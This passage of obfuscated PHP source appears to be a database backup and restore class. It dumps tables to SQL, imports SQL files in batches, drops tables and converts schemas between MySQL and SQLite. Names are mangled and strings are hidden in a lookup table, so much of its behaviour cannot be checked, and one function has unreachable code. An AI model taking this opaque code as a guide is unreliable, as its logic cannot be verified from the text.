"\x5b{$Ô­î”ê}\x5d", !1); } } } public function sqlFromDb($¦Öê¬…, $Æ‰Ä†ÖÆ, &$ËºüĞ¾€, $¥±Ø†ı° = '') { $Û™ôÅâú =& $_SERVER[œ—üé‹ê]; if ($ËºüĞ¾€) { $ËºüĞ¾€->task[$Û™ôÅâú[1230]] = $¦Öê¬…; } $¥úº¸ù = $this->model($¦Öê¬…); $ıÜ§ ÒÓ = 0; $ŞÍÓï÷Š = 0; $íÜõ•ú¦ = 10000; $ßÄëäËö = fopen($Æ‰Ä†ÖÆ, $Û™ôÅâú[1232]); $‰®‰´â = $¥úº¸ù->getPk(); $ö¶åà = $¥úº¸ù->getDbFields(); $ñşŠ³ï = $Û™ôÅâú[12]; if ($GLOBALS[$Û™ôÅâú[899]] && in_array($¦Öê¬…, array($Û™ôÅâú[1233], $Û™ôÅâú[1234]))) { $ñşŠ³ï = $¦Öê¬…; } do { $Ï£ı¾¤ƒ = array($‰®‰´â => array($Û™ôÅâú[1181], $ŞÍÓï÷Š)); $¼°¿£‘û = $¥úº¸ù->where($Ï£ı¾¤ƒ)->field($ö¶åà)->order($‰®‰´â . $Û™ôÅâú[1235])->limit($íÜõ•ú¦)->select(); $¼°¿£‘û = !empty($¼°¿£‘û) ? $¼°¿£‘û : array(); if (!($İœœ²æä = count($¼°¿£‘û))) { break; } $Ë‰¡Ì¸ = end($¼°¿£‘û); $ŞÍÓï÷Š = $Ë‰¡Ì¸[$‰®‰´â]; $¦Â‡ëü­ = array(); foreach ($¼°¿£‘û as $¯á©š“ª) { if ($ñşŠ³ï) { if ($¦Öê¬… == $Û™ôÅâú[1233]) { if ($¯á©š“ª[$Û™ôÅâú[33]] == $Û™ôÅâú[1236]) { $Ë‡§Û = json_decode($¯á©š“ª[$Û™ôÅâú[451]], !0); if ($Ë‡§Û[$Û™ôÅâú[32]] == $GLOBALS[$Û™ôÅâú[899]] && $Ë‡§Û[$Û™ôÅâú[859]] != 1) { continue; } } } else { if ($¯á©š“ª[$Û™ôÅâú[33]] == $Û™ôÅâú[1237] && $¯á©š“ª[$Û™ôÅâú[95]] == $Û™ôÅâú[895]) { continue; } } } $¦Â‡ëü­[] = $Û™ôÅâú[1238] . $this->sqlEncode($¯á©š“ª) . $Û™ôÅâú[1239]; } $ÚùŠí»Ø = "\111\x4e\123\105\x52\124\40\x49\116\124\117\x20\x60{$¦Öê¬…}\x60\x20\x28\140" . implode($Û™ôÅâú[1240], $ö¶åà) . $Û™ôÅâú[1241]; fwrite($ßÄëäËö, $ÚùŠí»Ø . implode($Û™ôÅâú[1242], $¦Â‡ëü­) . $Û™ôÅâú[74] . PHP_EOL); $ıÜ§ ÒÓ += $İœœ²æä; if ($ËºüĞ¾€) { $ËºüĞ¾€->update($İœœ²æä); } } while ($íÜõ•ú¦ == $İœœ²æä); fclose($ßÄëäËö); return $ıÜ§ ÒÓ; } public function sqlToDb($ÆÚ–ş, &$ÏŠ·şªŒ) { $ó©ñºª =& $_SERVER[œ—üé‹ê]; $Úº¾Öåå = $this->model()->db(); $÷ÖÌ—Ì = @fopen($ÆÚ–ş, $ó©ñºª[1243]); if (!$÷ÖÌ—Ì) { return !1; } $›ÂÀô‚œ = 0; $á–¥´‡û = $ó©ñºª[12]; $Çşá‹ğÊ = array(); $ğÌüôÓ­ = $this->dbType(); $¤Åšú¥ = $ğÌüôÓ­ == $ó©ñºª[13] ? 500 : 2000; $éÅ…šï = basename($ÆÚ–ş, $ó©ñºª[900]); $Åâ­æ = 0; $¬©ÔØ¶– = 4194304; while (!feof($÷ÖÌ—Ì)) { $ùŞÇ¬ñİ = trim(fgets($÷ÖÌ—Ì)); if (!$ùŞÇ¬ñİ) { continue; } $ÍÈ§éä = $this->sqlDecode($ùŞÇ¬ñİ, $ğÌüôÓ­, $éÅ…šï); if (stripos($ÍÈ§éä, $ó©ñºª[430]) === 0) { if (!$á–¥´‡û) { $á–¥´‡û = $ÍÈ§éä . $ó©ñºª[53]; } continue; } if ($ÏŠ·şªŒ) { $ÏŠ·şªŒ->task[$ó©ñºª[961]] += 1; } $›ÂÀô‚œ++; $Çşá‹ğÊ[] = rtrim(rtrim(trim($ÍÈ§éä), $ó©ñºª[50]), $ó©ñºª[74]); $ÙËñ¾å£ = null; $ïßĞÈ = strlen($ÍÈ§éä); $Åâ­æ += $ïßĞÈ; $¼çœ¨Ğ = strlen($á–¥´‡û) + $Åâ­æ + (count($Çşá‹ğÊ) - 1); if ($¼çœ¨Ğ >= $¬©ÔØ¶–) { $ÙËñ¾å£ = array_pop($Çşá‹ğÊ); if ($›ÂÀô‚œ > 1) { $›ÂÀô‚œ--; } } if ($›ÂÀô‚œ >= $¤Åšú¥ || $ÙËñ¾å£) { $ÍÈ§éä = $á–¥´‡û . implode($ó©ñºª[50], $Çşá‹ğÊ); if (!$Úº¾Öåå->execute($ÍÈ§éä)) { return !1; } if ($ÏŠ·şªŒ) { $ÏŠ·şªŒ->update($›ÂÀô‚œ); } $Çşá‹ğÊ = array(); $›ÂÀô‚œ = 0; $Åâ­æ = 0; if ($ÙËñ¾å£) { $Çşá‹ğÊ = array($ÙËñ¾å£); $›ÂÀô‚œ = 1; $Åâ­æ = $ïßĞÈ; } } } fclose($÷ÖÌ—Ì); if (!empty($Çşá‹ğÊ)) { $ÍÈ§éä = $á–¥´‡û . implode($ó©ñºª[50], $Çşá‹ğÊ); if (!$Úº¾Öåå->execute($ÍÈ§éä)) { return !1; } if ($ÏŠ·şªŒ) { $ÏŠ·şªŒ->update($›ÂÀô‚œ); } } return !0; } public function dropTable($Îöı = null) { $İ¸Âì˜º =& $_SERVER[œ—üé‹ê]; $ÚÔ­È«Ò = $this->model()->db(); $ª†Áß¡ = $Îöı ? array($Îöı) : $ÚÔ­È«Ò->getTables(); if (!$ª†Áß¡) { return; } foreach ($ª†Áß¡ as $Îöı) { if ($Îöı) { $Îöı = strtolower($Îöı); } else { continue; } $ÚÔ­È«Ò->execute($İ¸Âì˜º[1244] . $this->escapeName($Îöı) . $İ¸Âì˜º[1245]); } } private function sqlEncode($«âÂÌ³´) { $¿ŒÏ»şØ =& $_SERVER[œ—üé‹ê]; $•ë§†˜  = array(); foreach ($«âÂÌ³´ as $Û•íğò—) { if (is_array($Û•íğò—)) { $Û•íğò— = json_encode_force($Û•íğò—); } $Û•íğò— = addslashes($Û•íğò—); $Û•íğò— = str_replace(array($¿ŒÏ»şØ[1246], $¿ŒÏ»şØ[285], $¿ŒÏ»şØ[417]), array($¿ŒÏ»şØ[1247], $¿ŒÏ»şØ[1248], $¿ŒÏ»şØ[1249]), $Û•íğò—); $•ë§†˜ [] = $Û•íğò—; } return $¿ŒÏ»şØ[58] . implode($¿ŒÏ»şØ[1250], $•ë§†˜ ) . $¿ŒÏ»şØ[58]; } private function sqlDecode($Û¼°ö¿, $êö¥©ğå, $Ã®ÉÅğ = '') { $«”Çœ¬‰ =& $_SERVER[œ—üé‹ê]; $Û¼°ö¿ = str_replace(array($«”Çœ¬‰[1247], $«”Çœ¬‰[1248], $«”Çœ¬‰[1249]), array($«”Çœ¬‰[1246], $«”Çœ¬‰[285], $«”Çœ¬‰[417]), $Û¼°ö¿); if ($êö¥©ğå == $«”Çœ¬‰[13]) { $Û¼°ö¿ = str_ireplace($«”Çœ¬‰[1251], $«”Çœ¬‰[59], $Û¼°ö¿); $Û¼°ö¿ = stripslashes($Û¼°ö¿); } return preg_replace($«”Çœ¬‰[1252], $«”Çœ¬‰[12], $Û¼°ö¿); if ($êö¥©ğå == $«”Çœ¬‰[13]) { return $Ã®ÉÅğ != $«”Çœ¬‰[472] ? stripslashes($Û¼°ö¿) : $Û¼°ö¿; } if ($Ã®ÉÅğ == $«”Çœ¬‰[472]) { $Û¼°ö¿ = str_replace($«”Çœ¬‰[1253], $«”Çœ¬‰[118], stripslashes($Û¼°ö¿)); } return $Û¼°ö¿; } public function getSqlFile($ÔÙŒ™Ú½ = '') { $ØÑæ¢Ùä =& $_SERVER[œ—üé‹ê]; $´™«ş = $this->dbType(!0); $üÚŒ”Î¤ = CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\x6c\x6c\x2f\x64\x61\x74\x61\57{$´™«ş}\x2e\x73\161\154"; if (!file_exists($üÚŒ”Î¤)) { return !1; } $¡ùúÙœÙ = file_get_contents($üÚŒ”Î¤); $¤À…á´ = $ØÑæ¢Ùä[1254] . ($´™«ş == $ØÑæ¢Ùä[910] ? $ØÑæ¢Ùä[1255] : $ØÑæ¢Ùä[1256]) . $ØÑæ¢Ùä[1257]; preg_match_all($¤À…á´, $¡ùúÙœÙ, $¯çıìÛ»); $øıæà´Ë = $¯çıìÛ»[1]; $¶øŸûÃš = $this->model()->db(); $ñ‚€ËŒÓ = $¶øŸûÃš->getTables(); $¨Éäõ–’ = TEMP_FILES . $ØÑæ¢Ùä[1258] . date($ØÑæ¢Ùä[259]) . $ØÑæ¢Ùä[8]; del_dir($¨Éäõ–’); mk_dir($¨Éäõ–’); $óòÖ¯û = $¨Éäõ–’ . $ØÑæ¢Ùä[1259]; $Èüö¼‡° = $¨Éäõ–’ . $ØÑæ¢Ùä[1260]; $©ÍÆÂ¼ = $´™«ş == $ØÑæ¢Ùä[13] ? $ØÑæ¢Ùä[910] : $ØÑæ¢Ùä[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\x74\x61\154\x6c\x2f\x64\x61\x74\141\57{$©ÍÆÂ¼}\x2e\163\x71\x6c", $¨Éäõ–’); @touch($¨Éäõ–’ . $´™«ş . $ØÑæ¢Ùä[900]); $Â”ğÈüš = fopen($óòÖ¯û, $ØÑæ¢Ùä[1232]); $ÒÕé’²Æ = fopen($Èüö¼‡°, $ØÑæ¢Ùä[1232]); if ($´™«ş == $ØÑæ¢Ùä[13]) { $ñ‚€ËŒÓ = array_diff($ñ‚€ËŒÓ, array($ØÑæ¢Ùä[893], $ØÑæ¢Ùä[894])); $Ç±ååğ¶ = array($ØÑæ¢Ùä[1261], $ØÑæ¢Ùä[1262], $ØÑæ¢Ùä[1263]); fwrite($ÒÕé’²Æ, implode(PHP_EOL, $Ç±ååğ¶) . PHP_EOL . PHP_EOL); foreach ($ñ‚€ËŒÓ as $½Íí¤¯ö) { $éğ­ò’â = $this->sqlFromSqlite($½Íí¤¯ö); if (!$éğ­ò’â[$ØÑæ¢Ùä[13]]) { continue; } fwrite($ÒÕé’²Æ, $éğ­ò’â[$ØÑæ¢Ùä[13]] . PHP_EOL . PHP_EOL); if (!in_array($½Íí¤¯ö, $øıæà´Ë)) { fwrite($Â”ğÈüš, $éğ­ò’â[$ØÑæ¢Ùä[910]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ñ‚€ËŒÓ as $½Íí¤¯ö) { $éğ­ò’â = $this->sqlFromMysql($½Íí¤¯ö); if (!$éğ­ò’â[$ØÑæ¢Ùä[910]]) { continue; } fwrite($Â”ğÈüš, $éğ­ò’â[$ØÑæ¢Ùä[910]] . PHP_EOL . PHP_EOL); if (!in_array($½Íí¤¯ö, $øıæà´Ë)) { fwrite($ÒÕé’²Æ, $éğ­ò’â[$ØÑæ¢Ùä[13]] . PHP_EOL . PHP_EOL); } } } fclose($Â”ğÈüš); fclose($ÒÕé’²Æ); $¡ùúÙœÙ = array($ØÑæ¢Ùä[910] => $óòÖ¯û, $ØÑæ¢Ùä[13] => $Èüö¼‡°); return $ÔÙŒ™Ú½ ? $¡ùúÙœÙ[$ÔÙŒ™Ú½] : $¡ùúÙœÙ; } public function dbType($¸Õ×çÍ÷ = false) { $˜ïıˆ±… =& $_SERVER[œ—üé‹ê]; $İ’üÔÀ¹ = $¸Õ×çÍ÷ ? $GLOBALS[$˜ïıˆ±…[6]][$˜ïıˆ±…[21]] : $this->database; $İ’üÔÀ¹ = array_change_key_case($İ’üÔÀ¹); $Íá‡‰ûş = $İ’üÔÀ¹[$˜ïıˆ±…[1134]]; if ($Íá‡‰ûş == $˜ïıˆ±…[1131]) { $½Óö¡× = explode($˜ïıˆ±…[4], $İ’üÔÀ¹[$˜ïıˆ±…[1140]]); $Íá‡‰ûş = $½Óö¡×[0]; } $ø³ìÉ˜ª = array($˜ïıˆ±…[1264] => $˜ïıˆ±…[13], $˜ïıˆ±…[1079] => $˜ïıˆ±…[910]); if (isset($ø³ìÉ˜ª[$Íá‡‰ûş])) { $Íá‡‰ûş = $ø³ìÉ˜ª[$Íá‡‰ûş]; } return $Íá‡‰ûş; } public function sqlFromMysql($‰ Ø’¤‹, $¿İ‡ªÉä = '') { $Ù’°ı® =& $_SERVER[œ—üé‹ê]; $şşôäÅ = array($Ù’°ı®[910] => $Ù’°ı®[12], $Ù’°ı®[13] => $Ù’°ı®[12]); $ˆ¿Ó·À = $this->escapeName($‰ Ø’¤‹); $³šú±ğ© = $this->escapeName($‰ Ø’¤‹, $Ù’°ı®[13]); $’ÀÙ›¡ = $this->model()->db(); $™¯¡Øœ = $’ÀÙ›¡->query("\163\x68\x6f\x77\x20\143\x72\x65\141\x74\x65\x20\x74\141\x62\x6c\x65\x20{$ˆ¿Ó·À}\73"); if (!$™¯¡Øœ || !$™¯¡Øœ[0]) { return !1; } $Ë£ÖÃÉÄ = _get($™¯¡Øœ[0], $Ù’°ı®[1265], $Ù’°ı®[12]); if (!$Ë£ÖÃÉÄ) { return !1; } $Úõù…ÓÁ = "\x44\x52\117\x50\x20\124\x41\x42\114\x45\40\x49\x46\x20\105\x58\x49\123\x54\x53\x20{$ˆ¿Ó·À}\73" . PHP_EOL . $Ë£ÖÃÉÄ . $Ù’°ı®[74]; if ($¿İ‡ªÉä == $Ù’°ı®[910]) { return $Úõù…ÓÁ; } $şşôäÅ[$Ù’°ı®[910]] = $Úõù…ÓÁ; $ñê½¶Ç… = array_change_key_case($GLOBALS[$Ù’°ı®[6]][$Ù’°ı®[21]]); $×ıµ¤•Ï = $ñê½¶Ç…[$Ù’°ı®[1139]]; $Ç¼¥œŠ‘ = $Ù’°ı®[1266] . $×ıµ¤•Ï . "\47\x20\101\116\x44\40\x54\101\x42\x4c\105\137\116\x41\115\105\x20\75\40{$³šú±ğ©}\x3b"; $ò€”×Éà = "\123\x48\x4f\x57\40\111\x4e\x44\x45\130\40\x46\x52\x4f\x4d\40{$ˆ¿Ó·À}\73"; $‚Î€Áµò = $’ÀÙ›¡->query($Ç¼¥œŠ‘); if (empty($‚Î€Áµò)) { return $¿İ‡ªÉä ? $şşôäÅ[$¿İ‡ªÉä] : $şşôäÅ; } $‘Ó‡Ê—á = $’ÀÙ›¡->query($ò€”×Éà); $¥‰ŠÇÅ = $Ù’°ı®[12]; $ÇºáîÇ = array(); foreach ($‘Ó‡Ê—á as $¾ßÚäË¿) { if (!$¥‰ŠÇÅ && $¾ßÚäË¿[$Ù’°ı®[1267]] == $Ù’°ı®[1268]) { $¥‰ŠÇÅ = $¾ßÚäË¿[$Ù’°ı®[1269]]; } if (isset($ÇºáîÇ[$¾ßÚäË¿[$Ù’°ı®[1267]]])) { $ÇºáîÇ[$¾ßÚäË¿[$Ù’°ı®[1267]]][$Ù’°ı®[1270]][] = $¾ßÚäË¿[$Ù’°ı®[1269]]; continue; } $ÇºáîÇ[$¾ßÚäË¿[$Ù’°ı®[1267]]] = array($Ù’°ı®[1271] => $¾ßÚäË¿[$Ù’°ı®[1267]], $Ù’°ı®[1270] => array($¾ßÚäË¿[$Ù’°ı®[1269]]), $Ù’°ı®[1272] => $¾ßÚäË¿[$Ù’°ı®[1273]] == $Ù’°ı®[91] ? 0 : 1); } $¡†Ó¡× = array(); foreach ($ÇºáîÇ as $¾ßÚäË¿) { $ óú¦›’ = $¾ßÚäË¿[$Ù’°ı®[1271]] == $Ù’°ı®[1268]; $´–õÏí = $¾ßÚäË¿[$Ù’°ı®[1272]] == $Ù’°ı®[91] && !$ óú¦›’ ? $Ù’°ı®[1274] : $Ù’°ı®[12]; $Èö‹Áşó = $Ù’°ı®[1275] . $‰ Ø’¤‹ . $Ù’°ı®[11] . ($ óú¦›’ ? $Ù’°ı®[1276] : $¾ßÚäË¿[$Ù’°ı®[1271]]); $Š…±íƒ = $Ù’°ı®[1277] . implode($Ù’°ı®[1278], $¾ßÚäË¿[$Ù’°ı®[1270]]) . $Ù’°ı®[1279]; $¡†Ó¡×[] = sprintf($Ù’°ı®[1280], $Ù’°ı®[1281], $´–õÏí, $Ù’°ı®[1282], $Èö‹Áşó, $Ù’°ı®[1283], $‰ Ø’¤‹, $Š…±íƒ); } $ƒù­ô¹ı = array(); $ë’Õ¥“î = array($Ù’°ı®[1284] => $Ù’°ı®[390], $Ù’°ı®[1285] => $Ù’°ı®[390], $Ù’°ı®[364] => $Ù’°ı®[390], $Ù’°ı®[363] => $Ù’°ı®[390], $Ù’°ı®[1286] => $Ù’°ı®[1287], $Ù’°ı®[1288] => $Ù’°ı®[1287], $Ù’°ı®[1287] => $Ù’°ı®[1287], $Ù’°ı®[1289] => $Ù’°ı®[1287], $Ù’°ı®[282] => $Ù’°ı®[1287], $Ù’°ı®[1290] => $Ù’°ı®[1287], $Ù’°ı®[1291] => $Ù’°ı®[1287], $Ù’°ı®[1292] => $Ù’°ı®[1293], $Ù’°ı®[365] => $Ù’°ı®[1293], $Ù’°ı®[366] => $Ù’°ı®[1293], $Ù’°ı®[1294] => $Ù’°ı®[1294]); foreach ($‚Î€Áµò as $¾ßÚäË¿) { $¿İ‡ªÉä = _get($ë’Õ¥“î, $¾ßÚäË¿[$Ù’°ı®[1295]], $¾ßÚäË¿[$Ù’°ı®[1296]]); $Ğùé“”ü = $¾ßÚäË¿[$Ù’°ı®[1297]] == $Ù’°ı®[1062] ? $Ù’°ı®[1298] : $Ù’°ı®[1299]; $îÕ…Óâæ = $¾ßÚäË¿[$Ù’°ı®[1300]] == $¥‰ŠÇÅ ? $Ù’°ı®[1301] : $Ù’°ı®[12]; $µ—µ¤»Ù = $¾ßÚäË¿[$Ù’°ı®[1116]] ? strtoupper(str_replace($Ù’°ı®[11], $Ù’°ı®[12], $¾ßÚäË¿[$Ù’°ı®[1116]])) : $Ù’°ı®[12]; $ƒù­ô¹ı[] = sprintf($Ù’°ı®[1302], $¾ßÚäË¿[$Ù’°ı®[1300]], $¿İ‡ªÉä, $Ğùé“”ü, $îÕ…Óâæ, $µ—µ¤»Ù); } $‡µ¯Â® = array("\104\x52\117\120\x20\x54\x41\102\x4c\105\x20\111\x46\x20\105\130\x49\123\124\123\40{$³šú±ğ©}\x3b", "\x43\122\105\101\124\x45\x20\x54\x41\102\114\105\x20{$³šú±ğ©}\40\50", implode($Ù’°ı®[50] . PHP_EOL, $ƒù­ô¹ı), $Ù’°ı®[1303]); $ğÓ×à = implode(PHP_EOL, array_merge($‡µ¯Â®, $¡†Ó¡×)); if ($¿İ‡ªÉä == $Ù’°ı®[13]) { return $ğÓ×à; } $şşôäÅ[$Ù’°ı®[13]] = $ğÓ×à; return $şşôäÅ; } public function sqlFromSqlite($•÷œª²µ, $ ­“¤øó = '') { $°Óîâò =& $_SERVER[œ—üé‹ê]; $ìÇ·³éä = array($°Óîâò[910] => $°Óîâò[12], $°Óîâò[13] => $°Óîâò[12]); $ÕÛ±‹Â = $this->escapeName($•÷œª²µ); $êóèò¶ô = $this->escapeName($•÷œª²µ, $°Óîâò[13]); $©Åª¬ªá = $this->model()->db(); $÷Ã‚è‚ = "\120\122\x41\x47\x4d\x41\x20\x54\101\x42\114\x45\137\x49\116\106\x4f\x20\x28\47{$•÷œª²µ}\x27\51"; $‰Ö°°ª¼ = "\x53\105\x4c\105\103\x54\40\x2a\40\x46\x52\x4f\115\40\163\161\154\151\x74\x65\x5f\x6d\x61\163\164\x65\x72\40\x57\x48\x45\122\x45\x20\164\142\x6c\137\156\x61\x6d\x65\x20\x3d\40\47{$•÷œª²µ}\47"; $ÏŠÓ§·Ò = $©Åª¬ªá->query($÷Ã‚è‚); if (empty($ÏŠÓ§·Ò)) { return $ ­“¤øó ? $ìÇ·³éä[$ ­“¤øó] : $ìÇ·³éä; } $‰ıàîú© = $©Åª¬ªá->query($‰Ö°°ª¼); $‹û“¥¨ = $Ñ–º‘ø = array(); foreach ($‰ıàîú© as $Ù‡Âö°) { if ($Ù‡Âö°[$°Óîâò[33]] == $°Óîâò[357]) { $‹û“¥¨[] = $Ù‡Âö°[$°Óîâò[1304]]; } else { $Ñ–º‘ø[] = $Ù‡Âö°[$°Óîâò[1304]]; } } $Õ¤¹Å‹Œ = array_merge(array("\104\122\x4f\120\40\x54\x41\102\x4c\x45\x20\111\x46\x20\x45\130\x49\x53\124\123\x20{$êóèò¶ô}\x3b"), $‹û“¥¨, $Ñ–º‘ø); $Õ¤¹Å‹Œ = implode($°Óîâò[74] . PHP_EOL, $Õ¤¹Å‹Œ) . $°Óîâò[74]; if ($ ­“¤øó == $°Óîâò[13]) { return $Õ¤¹Å‹Œ; } $ìÇ·³éä[$°Óîâò[13]] = $Õ¤¹Å‹Œ; $ı½±·ŞÀ = $¡›ÀŸˆ = array(); $ıº¼” = array(); $•Ã¬Ö÷© = array(); foreach ($‰ıàîú© as $Ù‡Âö°) { if ($Ù‡Âö°[$°Óîâò[33]] == $°Óîâò[1305]) { $Ã©‘Ò€ê = $Ù‡Âö°[$°Óîâò[1304]]; $ü´µ¿– = stripos($Ã©‘Ò€ê, $°Óîâò[1274]) !== !1; $ï¸îÊî– = stripos($Ã©‘Ò€ê, $°Óîâò[1268]) !== !1; preg_match($°Óîâò[1306], $Ã©‘Ò€ê, $©ğ„£²); if (empty($©ğ„£²)) { continue; } $‹ÙµÊæ = array_map($°Óîâò[1307], explode($°Óîâò[50], $©ğ„£²[1])); $Ê½­”ü¿ = array(); foreach ($‹ÙµÊæ as $³ü…¾¯÷) { $…¬éšàï = trim($³ü…¾¯÷, $°Óîâò[1308]); $Ê½­”ü¿[] = $…¬éšàï; $ıº¼”[$…¬éšàï] = !0; } $•Ã¬Ö÷©[] = array($°Óîâò[32] => $Ù‡Âö°[$°Óîâò[32]], $°Óîâò[1304] => $Ã©‘Ò€ê, $°Óîâò[1309] => $ü´µ¿–, $°Óîâò[1310] => $ï¸îÊî–, $°Óîâò[1311] => $Ê½­”ü¿); } } $Š‡á©ÓØ = array($°Óîâò[1285] => $°Óîâò[1285], $°Óîâò[390] => $°Óîâò[1312], $°Óîâò[1293] => $°Óîâò[1313], $°Óîâò[1287] => $°Óîâò[1287], $°Óîâò[1294] => $°Óîâò[1314], $°Óîâò[1315] => $°Óîâò[1316]); $¥ÒïÚéã = array($°Óîâò[451], $°Óîâò[168], $°Óîâò[540]); $¹¬Ì˜÷¯ = array($°Óîâò[390], $°Óîâò[1293], $°Óîâò[1315], $°Óîâò[1285]); foreach ($ÏŠÓ§·Ò as $Ù‡Âö°) { $ó£¸¿º = $Ù‡Âö°[$°Óîâò[32]]; $®œâî°¥ = strtolower($Ù‡Âö°[$°Óîâò[33]]); if ($®œâî°¥ == $°Óîâò[1287] && isset($ıº¼”[$ó£¸¿º])) { $ ­“¤øó = in_array($ó£¸¿º, $¥ÒïÚéã) ? $°Óîâò[1287] : $°Óîâò[1317]; } else { $ ­“¤øó = _get($Š‡á©ÓØ, $®œâî°¥, $®œâî°¥); } if ($Ù‡Âö°[$°Óîâò[57]] > 0) { $¡›ÀŸˆ[$Ù‡Âö°[$°Óîâò[57]]] = $ó£¸¿º; } $€ş¿™ö = $°Óîâò[12]; if ($Ù‡Âö°[$°Óîâò[56]] !== null) { $âÚ¾èù¿ = $Ù‡Âö°[$°Óîâò[56]]; if (in_array($®œâî°¥, $¹¬Ì˜÷¯) && is_numeric($âÚ¾èù¿)) { $€ş¿™ö = "\104\x45\x46\x41\x55\114\x54\40{$âÚ¾èù¿}"; } else { if (strtolower($âÚ¾èù¿) === $°Óîâò[103]) { $€ş¿™ö = $Ù‡Âö°[$°Óîâò[35]] ? $°Óîâò[12] : $°Óîâò[1299]; } else { $„Ï¾ª–˜ = is_numeric($âÚ¾èù¿) ? $âÚ¾èù¿ : $°Óîâò[58] . addslashes($âÚ¾èù¿) . $°Óîâò[58]; $€ş¿™ö = "\104\x45\x46\x41\125\x4c\x54\x20{$„Ï¾ª–˜}"; } } } $ñ¹ÑÇìÀ = $Ù‡Âö°[$°Óîâò[35]] ? $°Óîâò[1298] : $°Óîâò[1318]; $€ÅáòÀ = stripos($®œâî°¥, $°Óîâò[364]) !== !1 && $Ù‡Âö°[$°Óîâò[57]] ? $°Óîâò[1319] : $°Óîâò[12]; $ı½±·ŞÀ[] = sprintf($°Óîâò[1320], $ó£¸¿º, $ ­“¤øó, $ñ¹ÑÇìÀ, $€ş¿™ö, $€ÅáòÀ); } if (!empty($¡›ÀŸˆ)) { ksort($¡›ÀŸˆ); $ñœå Ë† = $°Óîâò[475] . implode($°Óîâò[1240], $¡›ÀŸˆ) . $°Óîâò[475]; $ı½±·ŞÀ[] = "\120\x52\x49\115\101\x52\131\40\113\105\x59\x20\50{$ñœå Ë†}\x29"; } foreach ($•Ã¬Ö÷© as $Ï¬ö¥ª) { if ($Ï¬ö¥ª[$°Óîâò[1310]]) { continue; } $¬ëÊ¢° = array(); foreach ($Ï¬ö¥ª[$°Óîâò[1311]] as $³ü…¾¯÷) { $Š‡á©ÓØ = null; foreach ($ÏŠÓ§·Ò as $ç÷©øòÕ) { if ($ç÷©øòÕ[$°Óîâò[32]] == $³ü…¾¯÷) { $Š‡á©ÓØ = strtolower($ç÷©øòÕ[$°Óîâò[33]]); break; } } if ($Š‡á©ÓØ == $°Óîâò[1287] && in_array($³ü…¾¯÷, $¥ÒïÚéã)) { $¬ëÊ¢°[] = "\140{$³ü…¾¯÷}\140\50\x32\x35\60\51"; } else { $¬ëÊ¢°[] = "\140{$³ü…¾¯÷}\x60"; } } $®œâî°¥ = ($Ï¬ö¥ª[$°Óîâò[1309]] ? $°Óîâò[1321] : $°Óîâò[12]) . $°Óîâò[1322]; $€ô‘¥é = str_replace($°Óîâò[1275] . $•÷œª²µ . $°Óîâò[11], $°Óîâò[12], $Ï¬ö¥ª[$°Óîâò[32]]); $€ô‘¥é = str_replace($•÷œª²µ . $°Óîâò[11], $°Óîâò[12], $€ô‘¥é); $ı½±·ŞÀ[] = "{$®œâî°¥}\x20\140{$€ô‘¥é}\x60\40\50" . implode($°Óîâò[50], $¬ëÊ¢°) . $°Óîâò[1239]; } $ŞĞÀ¨° = array("\x44\122\117\120\x20\124\x41\102\114\105\40\x49\106\40\105\130\x49\x53\x54\123\x20{$ÕÛ±‹Â}\x3b", "\103\122\105\x41\124\105\x20\x54\x41\x42\x4c\105\x20{$ÕÛ±‹Â}\40\50", implode($°Óîâò[50] . PHP_EOL, $ı½±·ŞÀ), $°Óîâò[1323]); $ŞĞÀ¨° = implode(PHP_EOL, $ŞĞÀ¨°); if ($ ­“¤øó == $°Óîâò[910]) { return $ŞĞÀ¨°; } $ìÇ·³éä[$°Óîâò[910]] = $ŞĞÀ¨°; return $ìÇ·³éä; } private function escapeName($‰ç¹´ÚÁ, $õş³Úé = "\155\171\163\161\x6c") { $¾€°ÒÙ =& $_SERVER[œ—üé‹ê]; $‰ç¹´ÚÁ = preg_replace($¾€°ÒÙ[1324], $¾€°ÒÙ[12], $‰ç¹´ÚÁ); if ($õş³Úé === $¾€°ÒÙ[910]) { return "\x60{$‰ç¹´ÚÁ}\x60"; } return "\x22{$‰ç¹´ÚÁ}\x22"; } public function mixBakList($ÚØğ©·Ş) { $¨Ô…¿áº =& $_SERVER[œ—üé‹ê]; $ÚØğ©·Ş = rtrim($ÚØğ©·Ş, $¨Ô…¿áº[8]) . $¨Ô…¿áº[8]; $™Üû©š = $¨Ô…¿áº[1325]; $Åœ—Æ¢ = IO::listPath($ÚØğ©·Ş); if (empty($Åœ—Æ¢[$¨Ô…¿áº[86]])) { return !1; } $¼ÜİææÖ = array(); foreach ($Åœ—Æ¢[$¨Ô…¿áº[86]] as $³¿»ı´Œ => $ôÆ’´ëÙ) { if (!$ôÆ’´ëÙ[$¨Ô…¿áº[32]] || !$ôÆ’´ëÙ[$¨Ô…¿áº[87]]) { continue; } $îçÕúÈ = Mcrypt::encode($ôÆ’´ëÙ[$¨Ô…¿áº[32]], $™Üû©š); $®’¡‹® = md5($îçÕúÈ); IO::rename($ôÆ’´ëÙ[$¨Ô…¿áº[87]], $®’¡‹®); $¼ÜİææÖ[$®’¡‹®] = $îçÕúÈ; } $™ÀĞÏ › = md5($¨Ô…¿áº[1326] . $™Üû©š); IO::setContent($ÚØğ©·Ş . $™ÀĞÏ ›, json_encode($¼ÜİææÖ)); return !0; } public function unmixBakList($‹¦è«À) { $‚úĞ¸ñ =& $_SERVER[œ—üé‹ê]; $‹¦è«À = rtrim($‹¦è«À, $‚úĞ¸ñ[8]) . $‚úĞ¸ñ[8]; $á™Üäë± = $this->unmixBakListGet($‹¦è«À, !0); if (empty($á™Üäë±)) { return !1; } foreach ($á™Üäë± as $ô…àŠç => $Ãè»£Ñƒ) { $öÍ”¿¯Ï = IO::rename($‹¦è«À . $Ãè»£Ñƒ, $ô…àŠç); if (!$öÍ”¿¯Ï) { return !1; } } return !0; } public function unmixBakListGet($İØäÇì, $ğŠªÊ¡ = false) { $Œç¦ğ¢ =& $_SERVER[œ—üé‹ê]; $İØäÇì = rtrim($İØäÇì, $Œç¦ğ¢[8]) . $Œç¦ğ¢[8]; $°½–ÅÎ£ = $Œç¦ğ¢[1325]; $ÜºÆúï¹ = md5($Œç¦ğ¢[1326] . $°½–ÅÎ£); $Ğ™Î‰ßö = $İØäÇì . $ÜºÆúï¹; if (!IO::exist($Ğ™Î‰ßö)) { return !1; } $Ø“ÃÓ¥½ = json_decode(IO::getContent($Ğ™Î‰ßö), !0); if (empty($Ø“ÃÓ¥½)) { return !1; } 